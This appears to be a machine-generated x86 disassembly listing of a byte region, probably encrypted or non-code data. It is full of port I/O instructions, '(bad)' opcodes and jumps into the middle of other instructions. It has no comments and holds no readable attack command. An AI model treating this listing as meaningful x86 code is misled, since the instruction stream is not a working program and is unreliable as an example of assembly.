  42146e:	jns    0x421490
  421470:	jmp    0x42145d
  421472:	jmp    0x421463
  421474:	js     0x4214e7
  421476:	aam    0xe6
  421478:	jmp    0x421465
  42147a:	jne    0x4214f5
  42147c:	and    bl,ch
  42147e:	jmp    0x42146b
  421480:	ja     0x421403
  421482:	enter  0xebe8,0xeb
  421486:	ds jmp 0x42140a
  421489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42148a:	out    0xeb,eax
  42148c:	jmp    0x421465
  42148e:	pushf  
  42148f:	ja     0x421502
  421491:	enter  0xebe8,0xeb
  421495:	cmp    al,0xeb
  421497:	and    DWORD PTR [edi+eiz*8-0xfa91415],0xecfcec54
  4214a2:	in     al,dx
  4214a3:	ja     0x42151e
  4214a5:	and    bl,ch
  4214a7:	jmp    0x421494
  4214a9:	cmp    eax,0x81ebec56
  4214ae:	pusha  
  4214af:	call   0x71b8009f
  4214b4:	pop    eax
  4214b5:	out    0xeb,eax
  4214b7:	jmp    0x42150f
  4214b9:	in     al,dx
  4214ba:	jns    0x42143d
  4214bc:	fsub   st(0),st
  4214be:	jmp    0x4214ab
  4214c0:	ds jmp 0x421444
  4214c3:	je     0x4214ad
  4214c5:	jmp    0x4214b2
  4214c7:	outs   dx,DWORD PTR ds:[esi]
  4214c8:	mov    al,0xf4
  4214ca:	mov    bl,0x71
  4214cc:	pusha  
  4214cd:	out    0xeb,al
  4214cf:	jmp    0x4214bd
  4214d1:	in     al,dx
  4214d2:	in     al,dx
  4214d3:	in     al,dx
  4214d4:	mov    bl,0x71
  4214d6:	pop    eax
  4214d7:	out    0xeb,al
  4214d9:	jmp    0x4214c7
  4214db:	in     al,dx
  4214dc:	in     al,dx
  4214dd:	in     al,dx
  4214de:	xlat   BYTE PTR ds:[ebx]
  4214df:	sti    
  4214e0:	ja     0x421553
  4214e2:	pop    eax
  4214e3:	out    0xeb,al
  4214e5:	jmp    0x421556
  4214e7:	lods   al,BYTE PTR ds:[esi]
  4214e8:	in     eax,dx
  4214e9:	jne    0x42155c
  4214eb:	pop    eax
  4214ec:	out    0xeb,al
  4214ee:	jmp    0x42155f
  4214f0:	test   eax,0xebebe658
  4214f5:	neg    BYTE PTR [edi+0x4b]
  4214f8:	ja     0x421573
  4214fa:	pop    eax
  4214fb:	out    0xeb,al
  4214fd:	jmp    0x42156e
  4214ff:	test   al,0x79
  421501:	aam    0xe6
  421503:	jmp    0x4214f0
  421505:	in     al,dx
  421506:	pusha  
  421507:	cmp    esi,DWORD PTR [edi-0x7f]
  42150a:	pop    eax
  42150b:	out    0xeb,al
  42150d:	jmp    0x421586
  42150f:	jo     0x421492
  421511:	aam    0xe6
  421513:	jmp    0x421500
  421515:	cmp    al,0x77
  421517:	jns    0x421571
  421519:	out    0xeb,al
  42151b:	jmp    0x421594
  42151d:	add    DWORD PTR [esi+eiz*8+0x40efebeb],0x773e9079
  421528:	jno    0x421582
  42152a:	out    0xeb,eax
  42152c:	jmp    0x42151d
  42152e:	jno    0x421590
  421530:	out    0xeb,al
  421532:	jmp    0x421570
  421534:	aam    0xc9
  421536:	fucomp st(3)
  421538:	jmp    0x4215a9
  42153a:	mov    al,0xf8
  42153c:	ja     0x4215b7
  42153e:	pop    eax
  42153f:	out    0xeb,al
  421541:	jmp    0x4215ba
  421543:	and    DWORD PTR [eax-0x1a],0x80efebeb
  42154a:	jns    0x421520
  42154c:	out    0xeb,al
  42154e:	jmp    0x4215c5
  421550:	and    DWORD PTR [eax-0x1a],0x75d7ebeb
  421557:	mov    bl,0x71
  421559:	push   esp
  42155a:	out    0xeb,al
  42155c:	jmp    0x42154a
  42155e:	in     al,dx
  42155f:	in     al,dx
  421560:	in     al,dx
  421561:	ja     0x4215d4
  421563:	push   esp
  421564:	out    0xeb,al
  421566:	jmp    0x42158f
  421568:	jno    0x42158a
  42156a:	jmp    0x421557
  42156c:	jmp    0x421569
  42156e:	outs   dx,DWORD PTR ds:[esi]
  42156f:	fldlg2 
  421571:	in     al,dx
  421572:	in     al,dx
  421573:	mov    bl,0x71
  421575:	push   eax
  421576:	out    0xeb,al
  421578:	jmp    0x421566
  42157a:	in     al,dx
  42157b:	in     al,dx
  42157c:	in     al,dx
  42157d:	xlat   BYTE PTR ds:[ebx]
  42157e:	or     dh,BYTE PTR [edi+0x79]
  421581:	push   esp
  421582:	out    0xeb,al
  421584:	jmp    0x4215f5
  421586:	lods   eax,DWORD PTR ds:[esi]
  421587:	in     eax,dx
  421588:	jne    0x421603
  42158a:	push   esp
  42158b:	out    0xeb,al
  42158d:	jmp    0x421606
  42158f:	adc    DWORD PTR [eax-0x1a],0xae6febeb
  421596:	in     eax,dx
  421597:	jne    0x42151a
  421599:	push   eax
  42159a:	out    0xeb,al
  42159c:	jmp    0x421615
  42159e:	jno    0x4215f0
  4215a0:	out    0xeb,al
  4215a2:	jmp    0x4215cb
  4215a4:	xor    DWORD PTR [eax-0x13649005],edi
  4215aa:	in     al,dx
  4215ab:	in     al,dx
  4215ac:	ja     0x421627
  4215ae:	push   esp
  4215af:	out    0xeb,al
  4215b1:	jmp    0x4215da
  4215b3:	jns    0x4215d5
  4215b5:	jmp    0x4215a2
  4215b7:	jmp    0x4215b4
  4215b9:	outs   dx,DWORD PTR ds:[esi]
  4215ba:	mov    esp,ebp
  4215bc:	in     al,dx
  4215bd:	in     al,dx
  4215be:	ja     0x421541
  4215c0:	pop    eax
  4215c1:	out    0xeb,eax
  4215c3:	jmp    0x4215b4
  4215c5:	adc    DWORD PTR [esi+eiz*8-0x15],0xeea2fbeb
  4215cd:	pop    ds
  4215ce:	jno    0x421624
  4215d0:	out    0xeb,al
  4215d2:	jmp    0x42164b
  4215d4:	jns    0x42162e
  4215d6:	out    0xeb,eax
  4215d8:	jmp    0x4215c9
  4215da:	jns    0x421630
  4215dc:	out    0xeb,al
  4215de:	jmp    0x421654
  4215e0:	in     eax,dx
  4215e1:	ja     0x421654
  4215e3:	push   eax
  4215e4:	out    0xeb,al
  4215e6:	jmp    0x421607
  4215e8:	mov    esi,0xececeea5
  4215ed:	in     al,dx
  4215ee:	jecxz  0x4215cd
  4215f0:	jno    0x4215b0
  4215f2:	popa   
  4215f3:	push   ds
  4215f4:	ja     0x421577
  4215f6:	pop    eax
  4215f7:	out    0xeb,eax
  4215f9:	jmp    0x4215ea
  4215fb:	adc    DWORD PTR [esi+eiz*8-0x15],0xeea2fbeb
  421603:	ja     0x42167e
  421605:	push   eax
  421606:	out    0xeb,al
  421608:	jmp    0x421605
  42160a:	mov    ds:0xefbcf940,al
  42160f:	jno    0x421661
  421611:	out    0xeb,al
  421613:	jmp    0x421604
  421615:	mov    esp,0xe7587177
  42161a:	jmp    0x421607
  42161c:	out    dx,eax
  42161d:	jno    0x421673
  42161f:	out    0xeb,al
  421621:	jmp    0x421697
  421623:	cld    
  421624:	xlat   BYTE PTR ds:[ebx]
  421625:	sbb    al,0x77
  421627:	jns    0x421681
  421629:	out    0xeb,eax
  42162b:	jmp    0x42161c
  42162d:	jns    0x421683
  42162f:	out    0xeb,al
  421631:	jmp    0x42162e
  421633:	mov    ds:0x507177fd,al
  421638:	out    0xeb,al
  42163a:	jmp    0x421637
  42163c:	mov    ds:0xefbcf138,al
  421641:	jns    0x421693
  421643:	out    0xeb,al
  421645:	jmp    0x42165e
  421647:	mov    ebp,0xe7587177
  42164c:	jmp    0x421639
  42164e:	out    dx,eax
  42164f:	jno    0x4216a5
  421651:	out    0xeb,al
  421653:	jmp    0x4216c9
  421655:	cld    
  421656:	aad    0x10
  421658:	jmp    0x421645
  42165a:	jmp    0x421631
  42165c:	in     eax,dx
  42165d:	jmp    0x42164a
  42165f:	jmp    0x4216d8
  421661:	jns    0x4215e7
  421663:	out    0xeb,al
  421665:	jmp    0x4216dc
  421667:	jns    0x421681
  421669:	jmp    0x421656
  42166b:	jmp    0x4216e4
  42166d:	sbb    DWORD PTR [eax],0x77ebebeb
  421673:	jno    0x4215f9
  421675:	out    0xeb,al
  421677:	jmp    0x421668
  421679:	sub    BYTE PTR cs:[ebp+0x71],dh
  42167d:	fs call 0x79ba026e
  421683:	fs call 0x3dba0274
  421689:	cmp    al,0x75
  42168b:	sub    DWORD PTR [eax-0x18],0x71b2ebeb
  421692:	test   al,ch
  421694:	jmp    0x421681
  421696:	in     al,dx
  421697:	mov    dl,0x71
  421699:	test   eax,ebp
  42169b:	jmp    0x421688
  42169d:	in     al,dx
  42169e:	mov    dl,0x71
  4216a0:	xchg   al,ch
  4216a2:	jmp    0x42168f
  4216a4:	in     al,dx
  4216a5:	mov    dl,0x71
  4216a7:	xchg   eax,ebp
  4216a9:	jmp    0x421696
  4216ab:	in     al,dx
  4216ac:	jns    0x42171f
  4216ae:	test   al,ch
  4216b0:	jmp    0x42169d
  4216b2:	cmp    al,0x56
  4216b4:	sub    al,0x77
  4216b6:	jns    0x42171c
  4216b8:	call   0x3dba02a8
  4216bd:	cmp    al,0x3e
  4216bf:	ja     0x421732
  4216c1:	test   dh,ah
  4216c3:	jmp    0x4216b0
  4216c5:	cmp    al,0xeb
  4216c7:	sbb    eax,0x77ebebe8
  4216cd:	jno    0x421737
  4216cf:	call   0x71ba02bf
  4216d4:	test   dh,ah
  4216d6:	jmp    0x4216c3
  4216d8:	mov    bl,0x71
  4216da:	dec    esp
  4216db:	out    0xeb,al
  4216dd:	jmp    0x4216cb
  4216df:	in     al,dx
  4216e0:	in     al,dx
  4216e1:	in     al,dx
  4216e2:	xlat   BYTE PTR ds:[ebx]
  4216e3:	sti    
  4216e4:	ja     0x42175f
  4216e6:	dec    esp
  4216e7:	out    0xeb,al
  4216e9:	jmp    0x42175a
  4216eb:	lods   eax,DWORD PTR ds:[esi]
  4216ec:	in     eax,dx
  4216ed:	jne    0x421768
  4216ef:	dec    esp
  4216f0:	out    0xeb,al
  4216f2:	jmp    0x42176b
  4216f4:	or     DWORD PTR [esi+eiz*8-0x15],0x688127eb
  4216fc:	call   0xfda202ec
  421701:	ja     0x421774
  421703:	test   dh,ah
  421705:	jmp    0x4216f2
  421707:	out    dx,eax
  421708:	jno    0x421756
  42170a:	out    0xeb,al
  42170c:	jmp    0x4216c0
  42170e:	in     al,dx
  42170f:	in     al,dx
  421710:	xlat   BYTE PTR ds:[ebx]
  421711:	mov    esi,0xe7587977
  421716:	jmp    0x421703
  421718:	jne    0x421793
  42171a:	sbb    bl,ch
  42171c:	jmp    0x421709
  42171e:	ja     0x4216a1
  421720:	sbb    bl,ch
  421722:	jmp    0x42170f
  421724:	ja     0x421797
  421726:	pop    eax
  421727:	out    0xeb,eax
  421729:	jmp    0x42171a
  42172b:	sub    BYTE PTR cs:[ebp+0x71],dh
  42172f:	fs call 0x79ba0320
  421735:	fs call 0x3dba0326
  42173b:	inc    eax
  42173c:	ds ja  0x4217b0
  42173f:	pop    eax
  421740:	out    0xeb,eax
  421742:	jmp    0x421780
  421744:	ja     0x4217bf
  421746:	test   dh,ah
  421748:	jmp    0x421735
  42174a:	cmp    eax,0xebdbb2d4
  42174f:	jmp    0x4217c0
  421751:	mov    al,0xf8
  421753:	ja     0x4216d6
  421755:	fs call 0x2eba0346
  42175b:	and    BYTE PTR [edi+0x79],dh
  42175e:	fs call 0x2e32034f
  421764:	adc    al,0x75
  421766:	jno    0x421784
  421768:	jmp    0x421755
  42176a:	jmp    0x4217e3
  42176c:	and    DWORD PTR [eax+ebp*8-0x15],0x687177eb
  421774:	call   0x2eb80364
  421779:	cmp    al,0xb3
  42177b:	xor    eax,ebp
  42177d:	in     al,dx
  42177e:	in     al,dx
  42177f:	in     al,dx
  421780:	in     al,dx
  421781:	mov    bl,0x71
  421783:	mov    eax,0xecebebe7
  421788:	in     al,dx
  421789:	in     al,dx
  42178a:	in     al,dx
  42178b:	mov    bl,0x71
  42178d:	int3   
  42178e:	out    0xeb,al
  421790:	jmp    0x42177e
  421792:	in     al,dx
  421793:	in     al,dx
  421794:	in     al,dx
  421795:	mov    bl,0x71
  421797:	dec    eax
  421798:	out    0xeb,al
  42179a:	jmp    0x421788
  42179c:	in     al,dx
  42179d:	in     al,dx
  42179e:	in     al,dx
  42179f:	xlat   BYTE PTR ds:[ebx]
  4217a0:	sti    
  4217a1:	ja     0x42181c
  4217a3:	dec    eax
  4217a4:	out    0xeb,al
  4217a6:	jmp    0x421817
  4217a8:	lods   eax,DWORD PTR ds:[esi]
  4217a9:	in     eax,dx
  4217aa:	jne    0x421825
  4217ac:	dec    eax
  4217ad:	out    0xeb,al
  4217af:	jmp    0x421828
  4217b1:	and    DWORD PTR [eax+ebp*8-0x15],0x2ea3fbeb
  4217b9:	repnz and eax,0xebe64871
  4217bf:	jmp    0x4217bc
  4217c1:	outs   dx,DWORD PTR ds:[esi]
  4217c2:	mov    eax,ds:0x77ececec
  4217c7:	jns    0x421811
  4217c9:	out    0xeb,al
  4217cb:	jmp    0x421824
  4217cd:	mov    ch,0x14
  4217cf:	ja     0x421752
  4217d1:	fs call 0x70ba03c2
  4217d7:	imul   ah
  4217d9:	in     eax,dx
  4217da:	in     al,dx
  4217db:	in     al,dx
  4217dc:	jne    0x42180f
  4217de:	call   0xe68a915a
  4217e3:	jmp    0x4217d0
  4217e5:	push   edi
  4217e6:	mov    ch,0x14
  4217e8:	ja     0x42176b
  4217ea:	fs call 0x70ba03db
  4217f0:	div    al
  4217f2:	in     eax,dx
  4217f3:	in     al,dx
  4217f4:	in     al,dx
  4217f5:	jne    0x421868
  4217f7:	int3   
  4217f8:	out    0xeb,al
  4217fa:	jmp    0x421873
  4217fc:	jns    0x421846
  4217fe:	out    0xeb,al
  421800:	jmp    0x421859
  421802:	mov    ch,0x14
  421804:	ja     0x421787
  421806:	fs call 0x70ba03f7
  42180c:	div    ah
  42180e:	in     eax,dx
  42180f:	in     al,dx
  421810:	in     al,dx
  421811:	jne    0x421884
  421813:	mov    eax,0x6febebe7
  421818:	test   eax,0xebebe7b8
  42181d:	in     al,dx
  42181e:	bound  eax,QWORD PTR [eax]
  421820:	ja     0x42185b
  421822:	call   0xe7fa914e
  421827:	jmp    0x421814
  421829:	pop    edi
  42182a:	cmc    
  42182b:	ja     0x4217ae
  42182d:	mov    eax,0x75ebebe7
  421832:	inc    ecx
  421833:	call   0xe7fac1a7
  421838:	jmp    0x421825
  42183a:	in     al,dx
  42183b:	bound  esp,QWORD PTR ds:0xe7b87177
  421841:	jmp    0x42182e
  421843:	cmp    al,0x77
  421845:	jns    0x42188f
  421847:	out    0xeb,al
  421849:	jmp    0x4218a2
  42184b:	mov    ch,0x14
  42184d:	ja     0x4217d0
  42184f:	fs call 0x71ba0440
  421855:	pop    eax
  421856:	out    0xeb,eax
  421858:	jmp    0x421849
  42185a:	jo     0x421852
  42185c:	clc    
  42185d:	in     eax,dx
  42185e:	in     al,dx
  42185f:	in     al,dx
  421860:	cmp    al,0x77
  421862:	jns    0x4217e8
  421864:	out    0xeb,al
  421866:	jmp    0x421857
  421868:	jns    0x421836
  42186a:	out    0xeb,al
  42186c:	jmp    0x4218ab
  42186e:	aam    0x8f
  421870:	(bad)  
  421872:	jmp    0x4218e3
  421874:	mov    al,0xf8
  421876:	aad    0x12
  421878:	jmp    0x421865
  42187a:	jmp    0x4218f3
  42187c:	add    DWORD PTR [esi+eiz*8-0x7e8a1415],0xebebeb18
  421887:	ja     0x4218fa
  421889:	sbb    bl,ch
  42188b:	jmp    0x421878
  42188d:	ja     0x421908
  42188f:	test   dh,ah
  421891:	jmp    0x42187e
  421893:	out    dx,eax
  421894:	xor    al,0x28
  421896:	jne    0x421911
  421898:	fs call 0x81ba0489
  42189e:	fs call 0x71ba048f
  4218a4:	test   dh,ah
  4218a6:	jmp    0x421893
  4218a8:	out    dx,eax
  4218a9:	outs   dx,BYTE PTR ds:[esi]
  4218aa:	ins    BYTE PTR es:[edi],dx
  4218ab:	in     al,dx
  4218ac:	in     al,dx
  4218ad:	in     al,dx
  4218ae:	jne    0x421921
  4218b0:	push   esp
  4218b1:	out    0xeb,eax
  4218b3:	jmp    0x42192c
  4218b5:	jns    0x42191b
  4218b7:	call   0xa5b204a7
  4218bc:	jo     0x4218aa
  4218be:	in     al,dx
  4218bf:	in     al,dx
  4218c0:	in     al,dx
  4218c1:	popa   
  4218c2:	div    BYTE PTR [ebx-0x1418ab8f]
  4218c8:	jmp    0x4218b6
  4218ca:	in     al,dx
  4218cb:	in     al,dx
  4218cc:	in     al,dx
  4218cd:	mov    bl,0x71
  4218cf:	shl    dh,1
  4218d1:	jmp    0x4218be
  4218d3:	in     al,dx
  4218d4:	in     al,dx
  4218d5:	in     al,dx
  4218d6:	in     al,dx
  4218d7:	mov    bl,0x71
  4218d9:	sbb    bh,ah
  4218db:	jmp    0x4218c8
  4218dd:	in     al,dx
  4218de:	in     al,dx
  4218df:	in     al,dx
  4218e0:	in     al,dx
  4218e1:	mov    bl,0x31
  4218e3:	sub    ah,0xec
  4218e6:	in     al,dx
  4218e7:	in     al,dx
  4218e8:	mov    bl,0x71
  4218ea:	cmp    al,0xeb
  4218ec:	jmp    0x4218d9
  4218ee:	in     al,dx
  4218ef:	in     al,dx
  4218f0:	in     al,dx
  4218f1:	in     al,dx
  4218f2:	push   esp
  4218f3:	in     al,dx
  4218f4:	ins    BYTE PTR es:[edi],dx
  4218f5:	in     al,dx
  4218f6:	in     al,dx
  4218f7:	push   esi
  4218f8:	in     al,dx
  4218f9:	ja     0x42187c
  4218fb:	pop    eax
  4218fc:	out    0xeb,eax
  4218fe:	jmp    0x42193e
  421900:	jmp    0x421883
  421902:	dec    eax
  421903:	out    0xeb,eax
  421905:	jmp    0x421976
  421907:	test   eax,0xebebe754
  42190c:	in     al,dx
  42190d:	sti    
  42190e:	jo     0x42197e
  421910:	in     eax,dx
  421911:	in     al,dx
  421912:	in     al,dx
  421913:	ja     0x421986
  421915:	push   esp
  421916:	out    0xeb,eax
  421918:	jmp    0x421989
  42191a:	fs clc 
  42191c:	in     al,dx
  42191d:	sti    
  42191e:	jo     0x42197e
  421920:	in     eax,dx
  421921:	in     al,dx
  421922:	in     al,dx
  421923:	ja     0x42199e
  421925:	push   esp
  421926:	out    0xeb,eax
  421928:	jmp    0x4219a1
  42192a:	add    DWORD PTR [esi+eiz*8+0x3defebeb],0xcc8175f8
  421935:	call   0x71ba0525
  42193a:	int3   
  42193b:	call   0xeb7f052b
  421940:	inc    ecx
  421941:	test   BYTE PTR [ebp+0x71],dh
  421944:	shl    dh,1
  421946:	jmp    0x421933
  421948:	outs   dx,DWORD PTR ds:[esi]
  421949:	test   eax,0xebebe6d0
  42194e:	in     al,dx
  42194f:	popa   
  421950:	push   DWORD PTR [edi+0x79]
  421953:	int3   
  421954:	call   0xeb800544
  421959:	xor    DWORD PTR [eax],0x75ebebe7
  42195f:	jno    0x421931
  421961:	out    0xeb,al
  421963:	jmp    0x4219d4
  421965:	test   eax,0xebebe6d0
  42196a:	in     al,dx
  42196b:	pusha  
  42196c:	and    dh,BYTE PTR [edi-0x7f]
  42196f:	push   esp
  421970:	out    0xeb,eax
  421972:	jmp    0x4219e3
  421974:	es in  al,dx
  421976:	popa   
  421977:	add    esi,DWORD PTR [edi+0x71]
  42197a:	push   esp
  42197b:	out    0xeb,eax
  42197d:	jmp    0x4219f6
  42197f:	jns    0x421905
  421981:	out    0xeb,al
  421983:	jmp    0x421974
  421985:	xor    al,0xfc
  421987:	jne    0x421a02
  421989:	sbb    bh,ah
  42198b:	jmp    0x421978
  42198d:	xlat   BYTE PTR ds:[ebx]
  42198e:	add    BYTE PTR [edi-0x7f],dh
  421991:	push   esp
  421992:	out    0xeb,eax
  421994:	jmp    0x421a0d
  421996:	jno    0x42191c
  421998:	out    0xeb,al
  42199a:	jmp    0x42198b
  42199c:	out    dx,al
  42199d:	jne    0x421a10
  42199f:	sbb    bh,ah
  4219a1:	jmp    0x42198e
  4219a3:	mov    bl,0x31
  4219a5:	sub    ah,0xec
  4219a8:	in     al,dx
  4219a9:	in     al,dx
  4219aa:	ja     0x421a25
  4219ac:	sbb    bh,ah
  4219ae:	jmp    0x42199b
  4219b0:	outs   dx,DWORD PTR ds:[esi]
  4219b1:	and    eax,0xb470fbec
  4219b6:	in     al,dx
  4219b7:	in     al,dx
  4219b8:	in     al,dx
  4219b9:	ja     0x42193c
  4219bb:	sbb    bh,ah
  4219bd:	jmp    0x4219aa
  4219bf:	ja     0x421a32
  4219c1:	test   dh,ah
  4219c3:	jmp    0x4219b0
  4219c5:	out    dx,eax
  4219c6:	out    dx,al
  4219c7:	jne    0x421a3a
  4219c9:	push   eax
  4219ca:	out    0xeb,eax
  4219cc:	jmp    0x421a3d
  4219ce:	test   eax,0xebebe750
  4219d3:	in     al,dx
  4219d4:	pusha  
  4219d5:	dec    eax
  4219d6:	ja     0x421a51
  4219d8:	push   eax
  4219d9:	out    0xeb,eax
  4219db:	jmp    0x421a4a
  4219dd:	int    0xec
  4219df:	in     al,dx
  4219e0:	in     al,dx
  4219e1:	ins    BYTE PTR es:[edi],dx
  4219e2:	ins    DWORD PTR es:[edi],dx
  4219e3:	in     eax,0xec
  4219e5:	in     al,dx
  4219e6:	in     al,dx
  4219e7:	ins    BYTE PTR es:[edi],dx
  4219e8:	pusha  
  4219e9:	or     esi,DWORD PTR [edi-0x7f]
  4219ec:	push   eax
  4219ed:	out    0xeb,eax
  4219ef:	jmp    0x421a60
  4219f1:	scas   al,BYTE PTR es:[edi]
  4219f2:	out    dx,al
  4219f3:	ds ja  0x421a67
  4219f6:	shl    dh,1
  4219f8:	jmp    0x4219e5
  4219fa:	cmp    al,0xeb
  4219fc:	add    DWORD PTR [edi+eiz*8-0x15],0x3c7175eb
  421a04:	jmp    0x4219f1
  421a06:	jmp    0x4219df
  421a08:	adc    eax,0x50797752
  421a0d:	out    0xeb,eax
  421a0f:	jmp    0x421a63
  421a11:	jne    0x421a8c
  421a13:	inc    esp
  421a14:	out    0xeb,al
  421a16:	jmp    0x421a13
  421a18:	mov    ds:0xebe64481,eax
  421a1d:	jmp    0x421a5d
  421a1f:	ja     0x421a92
  421a21:	shl    dh,1
  421a23:	jmp    0x421a10
  421a25:	cmp    al,0xeb
  421a27:	add    DWORD PTR [edi+eiz*8-0x15],0x3c7175eb
  421a2f:	jmp    0x421a1c
  421a31:	jmp    0x421aaa
  421a33:	jns    0x421a89
  421a35:	out    0xeb,eax
  421a37:	jmp    0x421aa8
  421a39:	gs cld 
  421a3b:	in     al,dx
  421a3c:	pusha  
  421a3d:	adc    dh,BYTE PTR [edi-0x7f]
  421a40:	push   esp
  421a41:	out    0xeb,eax
  421a43:	jmp    0x421abc
  421a45:	jno    0x4219cb
  421a47:	out    0xeb,al
  421a49:	jmp    0x421a3a
  421a4b:	cs cld 
  421a4d:	out    dx,eax
  421a4e:	xor    DWORD PTR [eax-0x19bf8e8b],eax
  421a54:	jmp    0x421a41
  421a56:	ja     0x421ad1
  421a58:	inc    eax
  421a59:	out    0xeb,al
  421a5b:	jmp    0x421ad4
  421a5d:	cmp    DWORD PTR [ebx+ebp*8],0xfd75ebeb
  421a64:	ja     0x421a97
  421a66:	sub    BYTE PTR [edi-0x54],0xf0
  421a6a:	jne    0x421a9d
  421a6c:	xor    BYTE PTR [edi+0x79],0x18
  421a70:	out    0xeb,eax
  421a72:	jmp    0x421ae3
  421a74:	lods   eax,DWORD PTR ds:[esi]
  421a75:	lock jne 0x421af1
  421a78:	sbb    bh,ah
  421a7a:	jmp    0x421a67
  421a7c:	aad    0x15
  421a7e:	jmp    0x421a6b
  421a80:	jmp    0x421af9
  421a82:	adc    DWORD PTR [edi+eiz*8-0x15],0xae6feb
  421a8a:	jne    0x421a0d
  421a8c:	push   esp
  421a8d:	out    0xeb,eax
  421a8f:	jmp    0x421a66
  421a91:	push   0xffffffea
  421a93:	jmp    0x421a80
  421a95:	ja     0x421b08
  421a97:	fs call 0x79ba0688
  421a9d:	test   dh,ah
  421a9f:	jmp    0x421a8c
  421aa1:	out    dx,eax
  421aa2:	je     0x421a54
  421aa4:	in     al,dx
  421aa5:	in     al,dx
  421aa6:	in     al,dx
  421aa7:	jno    0x421a5e
  421aa9:	sti    
  421aaa:	jb     0x421ab5
  421aac:	icebp  
  421aad:	in     al,dx
  421aae:	in     al,dx
  421aaf:	mov    dl,0x71
  421ab1:	mov    esi,fs
  421ab3:	jmp    0x421aa0
  421ab5:	xor    esi,DWORD PTR [edx-0x1419728f]
  421abb:	jmp    0x421b0e
  421abd:	mov    dl,0x71
  421abf:	mov    fs,esi
  421ac1:	jmp    0x421aae
  421ac3:	pusha  
  421ac4:	mov    dl,0x71
  421ac6:	(bad)  
  421ac7:	out    0xeb,al
  421ac9:	jmp    0x421b0d
  421acb:	mov    dl,0x71
  421acd:	nop
  421ace:	out    0xeb,al
  421ad0:	jmp    0x421b23
  421ad2:	mov    dl,0x71
  421ad4:	xchg   ecx,eax
  421ad5:	out    0xeb,al
  421ad7:	jmp    0x421b37
  421ad9:	mov    dl,0x71
  421adb:	xchg   edx,eax
  421adc:	out    0xeb,al
  421ade:	jmp    0x421b3f
  421ae0:	mov    dl,0x71
  421ae2:	xchg   ebx,eax
  421ae3:	out    0xeb,al
  421ae5:	jmp    0x421b3c
  421ae7:	mov    dl,0x71
  421ae9:	xchg   esp,eax
  421aea:	out    0xeb,al
  421aec:	jmp    0x421b49
  421aee:	mov    dl,0x71
  421af0:	xchg   ebp,eax
  421af1:	out    0xeb,al
  421af3:	jmp    0x421b4f
  421af5:	mov    dl,0x71
  421af7:	xchg   esi,eax
  421af8:	out    0xeb,al
  421afa:	jmp    0x421b2d
  421afc:	mov    dl,0x71
  421afe:	xchg   edi,eax
  421aff:	out    0xeb,al
  421b01:	jmp    0x421b67
  421b03:	mov    dl,0x71
  421b05:	cwde   
  421b06:	out    0xeb,al
  421b08:	jmp    0x421b37
  421b0a:	mov    dl,0x71
  421b0c:	cdq    
  421b0d:	out    0xeb,al
  421b0f:	jmp    0x421afd
  421b11:	jns    0x421a94
  421b13:	mov    esi,fs
  421b15:	jmp    0x421b02
  421b17:	ds ja  0x421b8b
  421b1a:	inc    eax
  421b1b:	jmp    0x421b08
  421b1d:	jmp    0x421b5b
  421b1f:	jmp    0x421aa2
  421b21:	inc    esp
  421b22:	out    0xeb,eax
  421b24:	jmp    0x421b9b
  421b26:	jno    0x421b94
  421b28:	call   0x71f60718
  421b2d:	mov    esp,0x88ebebe7
  421b32:	in     al,dx
  421b33:	in     al,dx
  421b34:	in     al,dx
  421b35:	jns    0x421bb0
  421b37:	mov    esp,0x3debebe7
  421b3c:	jmp    0x421abf
  421b3e:	ins    BYTE PTR es:[edi],dx
  421b3f:	call   0x71f5072f
  421b44:	test   al,ch
  421b46:	jmp    0x421b33
  421b48:	pop    edx
  421b49:	mov    dl,0x71
  421b4b:	test   eax,ebp
  421b4d:	jmp    0x421b3a
  421b4f:	pusha  
  421b50:	mov    dl,0x71
  421b52:	xchg   al,ch
  421b54:	jmp    0x421b41
  421b56:	push   eax
  421b57:	mov    dl,0x71
  421b59:	xchg   eax,ebp
  421b5b:	jmp    0x421b48
  421b5d:	pop    eax
  421b5e:	mov    dl,0x71
  421b60:	mov    al,ch
  421b62:	jmp    0x421b4f
  421b64:	pop    eax
  421b65:	mov    dl,0x71
  421b67:	mov    eax,ebp
  421b69:	jmp    0x421b56
  421b6b:	sbb    dh,BYTE PTR [edx-0x1417758f]
  421b71:	jmp    0x421bc3
  421b73:	mov    dl,0x71
  421b75:	mov    ebp,eax
  421b77:	jmp    0x421b64
  421b79:	pop    eax
  421b7a:	mov    dl,0x71
  421b7c:	mov    eax,gs
  421b7e:	jmp    0x421b6b
  421b80:	pop    eax
  421b81:	mov    dl,0x71
  421b83:	(bad)  
  421b84:	call   0x7a2f0774
  421b89:	add    DWORD PTR [eax+ebp*8-0x14c11415],0x71758441
  421b94:	test   dh,ah
  421b96:	jmp    0x421b83
  421b98:	mov    dl,0x71
  421b9a:	mov    esi,fs
  421b9c:	jmp    0x421b89
  421b9e:	ds mov dl,0x71
  421ba1:	(bad)  
  421ba2:	out    0xeb,al
  421ba4:	jmp    0x421c06
  421ba6:	mov    dl,0x71
  421ba8:	mov    fs,esi
  421baa:	jmp    0x421b97
  421bac:	pop    eax
  421bad:	mov    dl,0x71
  421baf:	(bad)  
  421bb0:	out    0xeb,al
  421bb2:	jmp    0x421be9
  421bb4:	mov    dl,0x71
  421bb6:	nop
  421bb7:	out    0xeb,al
  421bb9:	jmp    0x421c14
  421bbb:	mov    dl,0x71
  421bbd:	xchg   ecx,eax
  421bbe:	out    0xeb,al
  421bc0:	jmp    0x421c0f
  421bc2:	mov    dl,0x71
  421bc4:	xchg   edx,eax
  421bc5:	out    0xeb,al
  421bc7:	jmp    0x421c1c
  421bc9:	mov    dl,0x71
  421bcb:	xchg   ebx,eax
  421bcc:	out    0xeb,al
  421bce:	jmp    0x421c21
  421bd0:	mov    dl,0x71
  421bd2:	xchg   esp,eax
  421bd3:	out    0xeb,al
  421bd5:	jmp    0x421c07
  421bd7:	mov    dl,0x71
  421bd9:	xchg   ebp,eax
  421bda:	out    0xeb,al
  421bdc:	jmp    0x421c33
  421bde:	mov    dl,0x71
  421be0:	xchg   esi,eax
  421be1:	out    0xeb,al
  421be3:	jmp    0x421c43
  421be5:	mov    dl,0x71
  421be7:	xchg   edi,eax
  421be8:	out    0xeb,al
  421bea:	jmp    0x421c3d
  421bec:	mov    dl,0x71
  421bee:	cwde   
  421bef:	out    0xeb,al
  421bf1:	jmp    0x421c42
  421bf3:	mov    dl,0x71
  421bf5:	cdq    
  421bf6:	out    0xeb,al
  421bf8:	jmp    0x421c5a
  421bfa:	mov    dl,0x71
  421bfc:	call   0x71b2:0x5bebebe6
  421c03:	fwait
